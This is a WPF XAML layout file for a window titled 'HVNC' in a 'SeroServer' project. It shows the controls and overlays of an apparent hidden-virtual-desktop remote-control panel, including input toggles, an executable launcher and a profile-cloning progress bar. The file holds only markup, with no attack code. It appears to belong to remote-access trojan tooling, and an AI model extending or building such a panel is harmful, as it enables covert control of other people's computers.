<Window x:Class="SeroServer.UI.HvncWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="HVNC"
        Width="960" Height="600" MinWidth="520" MinHeight="380"
        WindowStyle="None" AllowsTransparency="True"
        Background="Transparent" ResizeMode="CanResize">

    <Window.Resources>

        <!-- ── Input toggle (pill LED) ──────────────────────────────── -->
        <Style x:Key="PillToggle" TargetType="CheckBox">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="CheckBox">
                        <Border x:Name="Pill" CornerRadius="4" Padding="9,3"
                                Background="#0A0C18" BorderBrush="#1E2038" BorderThickness="1" Cursor="Hand">
                            <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                <Ellipse x:Name="Led" Width="6" Height="6" Fill="#252840"
                                         VerticalAlignment="Center" Margin="0,0,7,0"/>
                                <ContentPresenter VerticalAlignment="Center"
                                                  TextElement.FontSize="10"
                                                  TextElement.FontWeight="SemiBold"
                                                  TextElement.Foreground="#505878"
                                                  TextElement.FontFamily="Segoe UI"/>
                            </StackPanel>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsChecked" Value="True">
                                <Setter TargetName="Pill" Property="Background"  Value="#07101E"/>
                                <Setter TargetName="Pill" Property="BorderBrush" Value="#3A70D8"/>
                                <Setter TargetName="Led"  Property="Fill"        Value="#4A85F5"/>
                                <Setter TargetName="Led"  Property="Effect">
                                    <Setter.Value><DropShadowEffect Color="#4A85F5" BlurRadius="4" ShadowDepth="0" Opacity="0.8"/></Setter.Value>
                                </Setter>
                            </Trigger>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="Pill" Property="BorderBrush" Value="#2A3460"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- ── Gradient slider ──────────────────────────────────────── -->
        <Style x:Key="SlimSlider" TargetType="Slider">
            <Setter Property="VerticalAlignment" Value="Center"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Slider">
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="*"/><RowDefinition Height="Auto"/><RowDefinition Height="*"/>
                            </Grid.RowDefinitions>
                            <Track x:Name="PART_Track" Grid.Row="1">
                                <Track.DecreaseRepeatButton>
                                    <RepeatButton Command="Slider.DecreaseLarge" Focusable="False">
                                        <RepeatButton.Template>
                                            <ControlTemplate TargetType="RepeatButton">
                                                <Border Height="3" CornerRadius="1.5">
                                                    <Border.Background>
                                                        <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                                                            <GradientStop Color="#4A85F5" Offset="0"/>
                                                            <GradientStop Color="#7C5CE8" Offset="1"/>
                                                        </LinearGradientBrush>
                                                    </Border.Background>
                                                </Border>
                                            </ControlTemplate>
                                        </RepeatButton.Template>
                                    </RepeatButton>
                                </Track.DecreaseRepeatButton>
                                <Track.Thumb>
                                    <Thumb Width="12" Height="12" Cursor="Hand">
                                        <Thumb.Template>
                                            <ControlTemplate TargetType="Thumb">
                                                <Ellipse x:Name="tb" Width="12" Height="12" Fill="#4A85F5">
                                                    <Ellipse.Effect>
                                                        <DropShadowEffect Color="#4A85F5" BlurRadius="5" ShadowDepth="0" Opacity="0.5"/>
                                                    </Ellipse.Effect>
                                                </Ellipse>
                                                <ControlTemplate.Triggers>
                                                    <Trigger Property="IsMouseOver" Value="True">
                                                        <Setter TargetName="tb" Property="Fill" Value="#6AABFF"/>
                                                    </Trigger>
                                                    <Trigger Property="IsDragging" Value="True">
                                                        <Setter TargetName="tb" Property="Fill" Value="#7C5CE8"/>
                                                    </Trigger>
                                                </ControlTemplate.Triggers>
                                            </ControlTemplate>
                                        </Thumb.Template>
                                    </Thumb>
                                </Track.Thumb>
                                <Track.IncreaseRepeatButton>
                                    <RepeatButton Command="Slider.IncreaseLarge" Focusable="False">
                                        <RepeatButton.Template>
                                            <ControlTemplate TargetType="RepeatButton">
                                                <Border Height="3" Background="#1E2038" CornerRadius="1.5"/>
                                            </ControlTemplate>
                                        </RepeatButton.Template>
                                    </RepeatButton>
                                </Track.IncreaseRepeatButton>
                            </Track>
                        </Grid>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- ── Icon/action button ───────────────────────────────────── -->
        <Style x:Key="IconBtn" TargetType="Button">
            <Setter Property="Height"          Value="26"/>
            <Setter Property="FontSize"        Value="10"/>
            <Setter Property="FontWeight"      Value="SemiBold"/>
            <Setter Property="FontFamily"      Value="Segoe UI"/>
            <Setter Property="Cursor"          Value="Hand"/>
            <Setter Property="Background"      Value="#0F1020"/>
            <Setter Property="BorderBrush"     Value="#1E2038"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Foreground"      Value="#7080A8"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="bd" Background="{TemplateBinding Background}"
                                BorderBrush="{TemplateBinding BorderBrush}"
                                BorderThickness="{TemplateBinding BorderThickness}"
                                CornerRadius="4" Padding="{TemplateBinding Padding}">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="bd" Property="Background"  Value="#151828"/>
                                <Setter TargetName="bd" Property="BorderBrush" Value="#2A3460"/>
                                <Setter Property="Foreground" Value="#B0C8FF"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter TargetName="bd" Property="Background" Value="#090E1C"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="False">
                                <Setter TargetName="bd" Property="Opacity" Value="0.35"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

    </Window.Resources>

    <!-- Window shell -->
    <Border x:Name="RootBorder" CornerRadius="8" BorderThickness="1" ClipToBounds="True">
        <Border.Background><SolidColorBrush Color="#0C0D18"/></Border.Background>
        <Border.BorderBrush>
            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                <GradientStop Color="#2A2E50" Offset="0"/>
                <GradientStop Color="#141628" Offset="1"/>
            </LinearGradientBrush>
        </Border.BorderBrush>
        <Border.Effect>
            <DropShadowEffect Color="#000" BlurRadius="36" ShadowDepth="0" Opacity="0.80"/>
        </Border.Effect>

        <DockPanel LastChildFill="True">

            <!-- ── Accent bar ──────────────────────────────────────── -->
            <Rectangle DockPanel.Dock="Top" Height="2" IsHitTestVisible="False">
                <Rectangle.Fill>
                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                        <GradientStop Color="#4A85F5" Offset="0"/>
                        <GradientStop Color="#7C5CE8" Offset="1"/>
                    </LinearGradientBrush>
                </Rectangle.Fill>
            </Rectangle>

            <!-- ── Title bar ───────────────────────────────────────── -->
            <Border DockPanel.Dock="Top" Height="40" Background="#111222"
                    MouseLeftButtonDown="TitleBar_Drag">
                <Grid Margin="14,0">
                    <!-- Left: product identity -->
                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                        <TextBlock FontSize="11" FontWeight="SemiBold" Foreground="#A855F7" Margin="0,0,10,0" VerticalAlignment="Center">&#x1F48E; HVNC</TextBlock>
                        <TextBlock x:Name="TxtClientId" Text="" FontSize="11" FontFamily="Consolas" Foreground="#8890B8" VerticalAlignment="Center"/>
                        <!-- LIVE badge -->
                        <Border x:Name="LiveBadge" Margin="12,0,0,0" CornerRadius="3"
                                Background="#0C2016" BorderBrush="#1A6040" BorderThickness="1"
                                Padding="6,2" Visibility="Collapsed" VerticalAlignment="Center">
                            <StackPanel Orientation="Horizontal">
                                <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
                                    <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="4" ShadowDepth="0" Opacity="0.9"/></Ellipse.Effect>
                                </Ellipse>
                                <TextBlock Text="LIVE" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Segoe UI"/>
                            </StackPanel>
                        </Border>
                    </StackPanel>
                    <!-- Right: FPS + window controls -->
                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                        <Border Margin="0,0,12,0" Padding="8,3" CornerRadius="3" Background="#0A0C18" BorderBrush="#1E2038" BorderThickness="1">
                            <TextBlock x:Name="TxtFps" Text="— fps" Foreground="#404878"
                                       FontSize="10" FontFamily="Segoe UI Mono" MinWidth="44" TextAlignment="Center"/>
                        </Border>
                        <Button x:Name="BtnMenu" Content="☰" Width="28" Height="26" Margin="0,0,4,0"
                                Background="#0F1020" BorderBrush="#1E2038" BorderThickness="1"
                                Foreground="#606880" FontSize="14" Cursor="Hand" Padding="0"
                                ToolTip="Actions" Click="BtnMenu_Click"/>
                        <Button x:Name="BtnFullscreen" Content="⛶" Width="28" Height="26" Margin="0,0,4,0"
                                Style="{StaticResource IconBtn}" FontSize="13" Padding="0"
                                Click="BtnFullscreen_Click"/>
                        <Button Content="✕" Width="28" Height="26"
                                Style="{StaticResource SRedBtn}" Cursor="Hand"
                                Click="Close_Click" FontSize="10" Padding="0"/>
                    </StackPanel>
                </Grid>
            </Border>

            <!-- ── Toolbar ─────────────────────────────────────────── -->
            <Border DockPanel.Dock="Top" Background="#111222" Padding="12,8"
                    BorderBrush="#1A1C2E" BorderThickness="0,1,0,1">
                <DockPanel LastChildFill="False">

                    <!-- Right: START / STOP -->
                    <StackPanel DockPanel.Dock="Right" Orientation="Horizontal" VerticalAlignment="Center">
                        <Button x:Name="BtnStart" Content="START" Width="76" Height="26"
                                Style="{StaticResource SGreenBtn}" Click="BtnStart_Click"
                                FontSize="10" FontWeight="Bold" FontFamily="Segoe UI" Padding="14,3"/>
                        <Button x:Name="BtnStop" Content="STOP" Width="70" Height="26" Margin="5,0,0,0"
                                Style="{StaticResource SRedBtn}" Click="BtnStop_Click"
                                IsEnabled="False" Opacity="0.35"
                                FontSize="10" FontWeight="Bold" FontFamily="Segoe UI" Padding="14,3"/>
                    </StackPanel>

                    <!-- Right-2: Quality + FPS sliders -->
                    <StackPanel DockPanel.Dock="Right" Orientation="Horizontal"
                                VerticalAlignment="Center" Margin="0,0,14,0">
                        <Rectangle Width="1" Height="16" Margin="0,0,14,0">
                            <Rectangle.Fill><SolidColorBrush Color="#1E2038"/></Rectangle.Fill>
                        </Rectangle>
                        <!-- Quality -->
                        <TextBlock Text="QUALITY" Foreground="#404878" FontSize="9" FontWeight="SemiBold"
                                   FontFamily="Segoe UI" VerticalAlignment="Center" Margin="0,0,8,0"/>
                        <Slider x:Name="SldQuality" Minimum="20" Maximum="95" Value="75" Width="72"
                                Style="{StaticResource SlimSlider}"/>
                        <Border Margin="6,0,0,0" Padding="5,1" CornerRadius="3" Background="#0A0C18" BorderBrush="#1E2038" BorderThickness="1">
                            <TextBlock x:Name="TxtQuality" Text="75" Foreground="#8090C0"
                                       FontSize="10" FontFamily="Segoe UI Mono" Width="18" TextAlignment="Center"/>
                        </Border>
                        <!-- FPS -->
                        <Rectangle Width="1" Height="16" Margin="12,0">
                            <Rectangle.Fill><SolidColorBrush Color="#1E2038"/></Rectangle.Fill>
                        </Rectangle>
                        <TextBlock Text="FPS" Foreground="#404878" FontSize="9" FontWeight="SemiBold"
                                   FontFamily="Segoe UI" VerticalAlignment="Center" Margin="0,0,8,0"/>
                        <Slider x:Name="SldFps" Minimum="5" Maximum="30" Value="20" Width="58"
                                Style="{StaticResource SlimSlider}"/>
                        <Border Margin="6,0,0,0" Padding="5,1" CornerRadius="3" Background="#0A0C18" BorderBrush="#1E2038" BorderThickness="1">
                            <TextBlock x:Name="TxtFpsVal" Text="20" Foreground="#8090C0"
                                       FontSize="10" FontFamily="Segoe UI Mono" Width="18" TextAlignment="Center"/>
                        </Border>
                    </StackPanel>

                    <!-- Left: input toggles + app launcher -->
                    <StackPanel DockPanel.Dock="Left" Orientation="Horizontal" VerticalAlignment="Center">
                        <!-- Mouse toggle — icon only -->
                        <CheckBox x:Name="ChkMouse" IsChecked="True"
                                  Style="{StaticResource PillToggle}" Margin="0,0,4,0"
                                  ToolTip="Mouse input">
                            <TextBlock Text="&#x1F5B1;" FontSize="13" Foreground="#B8C4D4"/>
                        </CheckBox>
                        <!-- Keyboard toggle — icon only -->
                        <CheckBox x:Name="ChkKeyboard" IsChecked="True"
                                  Style="{StaticResource PillToggle}" Margin="0,0,8,0"
                                  ToolTip="Keyboard input">
                            <TextBlock Text="&#x2395;" FontSize="12" Foreground="#B8C4D4"/>
                        </CheckBox>
                        <!-- Clipboard sync toggle — same pill LED as mouse/keyboard -->
                        <CheckBox x:Name="ChkClipboard" IsChecked="False"
                                  Style="{StaticResource PillToggle}" Margin="0,0,8,0"
                                  ToolTip="Clipboard sync — when active, auto-pushes server clipboard to remote desktop"
                                  Checked="ChkClipboard_Checked" Unchecked="ChkClipboard_Unchecked">
                            <TextBlock Text="&#x2398;" FontSize="13" Foreground="#B8C4D4"/>
                        </CheckBox>
                        <Rectangle Width="1" Height="16" Margin="0,0,14,0">
                            <Rectangle.Fill><SolidColorBrush Color="#1E2038"/></Rectangle.Fill>
                        </Rectangle>
                        <TextBlock Text="APP" Foreground="#404878" FontSize="9" FontWeight="SemiBold"
                                   FontFamily="Segoe UI" VerticalAlignment="Center" Margin="0,0,8,0"/>
                        <ComboBox x:Name="CmbApp" Width="126" Height="26" Margin="0,0,5,0"
                                  Style="{StaticResource SCombo}"/>
                        <Button x:Name="BtnLaunch" Content="LAUNCH" Height="26" Padding="12,0"
                                Style="{StaticResource IconBtn}" FontSize="10" FontWeight="SemiBold"
                                Click="BtnLaunch_Click"/>
                        <Button x:Name="BtnCustomPath" Height="26" Width="28" Margin="4,0,0,0"
                                Style="{StaticResource IconBtn}" FontSize="13" Padding="0"
                                ToolTip="Browse custom executable"
                                Click="BtnCustomPath_Click">
                            <TextBlock Text="…" VerticalAlignment="Center" HorizontalAlignment="Center"/>
                        </Button>
                    </StackPanel>

                </DockPanel>
            </Border>

            <!-- ── Status bar ──────────────────────────────────────── -->
            <Border DockPanel.Dock="Bottom" Height="28" Background="#111222"
                    BorderBrush="#1A1C2E" BorderThickness="0,1,0,0">
                <Grid Margin="14,0">
                    <!-- Left: status text -->
                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                        <Ellipse x:Name="StatusDot" Width="6" Height="6" Fill="#252840"
                                 VerticalAlignment="Center" Margin="0,0,7,0"/>
                        <TextBlock x:Name="TxtStatus" Text="Stopped"
                                   Foreground="#404878" FontSize="10" FontFamily="Segoe UI"
                                   VerticalAlignment="Center"/>
                    </StackPanel>
                    <!-- Right: resolution + resize grip -->
                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                        <TextBlock x:Name="TxtResolution" Text=""
                                   Foreground="#303458" FontSize="9" FontFamily="Segoe UI Mono"
                                   VerticalAlignment="Center" Margin="0,0,10,0"/>
                        <Thumb Width="14" Height="14" VerticalAlignment="Bottom"
                               Cursor="SizeNWSE" DragDelta="ResizeGrip_DragDelta" Opacity="0.5">
                            <Thumb.Template>
                                <ControlTemplate TargetType="Thumb">
                                    <Path Data="M2,12 L12,2 M5,12 L12,5 M9,12 L12,9"
                                          Stroke="#4A85F5" StrokeThickness="1.2" Opacity="0.6"/>
                                </ControlTemplate>
                            </Thumb.Template>
                        </Thumb>
                    </StackPanel>
                </Grid>
            </Border>

            <!-- ── Video canvas ────────────────────────────────────── -->
            <Grid>
                <Rectangle Fill="#020306"/>
                <Image x:Name="ImgFrame"
                       Stretch="Fill" HorizontalAlignment="Stretch" VerticalAlignment="Stretch"
                       MouseMove="ImgFrame_MouseMove" MouseDown="ImgFrame_MouseDown"
                       MouseUp="ImgFrame_MouseUp" MouseWheel="ImgFrame_MouseWheel"
                       KeyDown="ImgFrame_KeyDown" KeyUp="ImgFrame_KeyUp" Focusable="True"/>
                <StackPanel x:Name="TxtPlaceholder" HorizontalAlignment="Center" VerticalAlignment="Center" IsHitTestVisible="False">
                    <TextBlock Text="Hidden desktop not started"
                               Foreground="#252848" FontSize="14" FontWeight="SemiBold"
                               FontFamily="Segoe UI" HorizontalAlignment="Center"/>
                    <TextBlock Text="Click START to open a hidden virtual desktop"
                               Foreground="#1E2038" FontSize="11" FontFamily="Segoe UI"
                               HorizontalAlignment="Center" Margin="0,4,0,0"/>
                </StackPanel>

                <!-- ── Profile clone progress overlay ─────────────────── -->
                <Grid x:Name="ProfileProgressOverlay" Visibility="Collapsed"
                      Background="#B2000000" IsHitTestVisible="False">
                    <Border HorizontalAlignment="Center" VerticalAlignment="Center"
                            Background="#141628" BorderBrush="#2A3460" BorderThickness="1"
                            CornerRadius="8" Padding="32,22" MinWidth="260">
                        <StackPanel>
                            <TextBlock x:Name="ProfileProgressLabel"
                                       Text="Cloning profile..."
                                       Foreground="#8090C0" FontSize="11" FontFamily="Segoe UI"
                                       FontWeight="SemiBold" HorizontalAlignment="Center"
                                       Margin="0,0,0,12"/>
                            <ProgressBar x:Name="ProfileProgressBar"
                                         Minimum="0" Maximum="100" Value="0"
                                         Height="6" Width="200"
                                         Background="#1E2038" BorderThickness="0"
                                         Foreground="#4A85F5"/>
                            <TextBlock x:Name="ProfileProgressPct"
                                       Text="0%"
                                       Foreground="#404878" FontSize="10" FontFamily="Segoe UI Mono"
                                       HorizontalAlignment="Center" Margin="0,8,0,0"/>
                        </StackPanel>
                    </Border>
                </Grid>

                <!-- Reconnecting overlay -->
                <Grid x:Name="ReconnectOverlay" Visibility="Collapsed" IsHitTestVisible="False">
                    <Rectangle Fill="#CC000000"/>
                    <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center">
                        <TextBlock x:Name="TxtReconnectIcon" Text="⟳" FontSize="36" Foreground="#60A5FA"
                                   HorizontalAlignment="Center" Margin="0,0,0,12">
                            <TextBlock.Triggers>
                                <EventTrigger RoutedEvent="Loaded">
                                    <BeginStoryboard>
                                        <Storyboard>
                                            <DoubleAnimation Storyboard.TargetProperty="Opacity"
                                                             From="0.3" To="1.0" Duration="0:0:0.8"
                                                             AutoReverse="True" RepeatBehavior="Forever"/>
                                        </Storyboard>
                                    </BeginStoryboard>
                                </EventTrigger>
                            </TextBlock.Triggers>
                        </TextBlock>
                        <TextBlock Text="Connection lost" Foreground="#DDE0F0" FontSize="16"
                                   FontWeight="SemiBold" FontFamily="Segoe UI" HorizontalAlignment="Center"/>
                        <TextBlock x:Name="TxtReconnectCountdown" Text="Reconnecting... (60s)"
                                   Foreground="#94A3B8" FontSize="12" FontFamily="Segoe UI"
                                   HorizontalAlignment="Center" Margin="0,6,0,0"/>
                    </StackPanel>
                </Grid>
            </Grid>

        </DockPanel>
    </Border>
</Window>
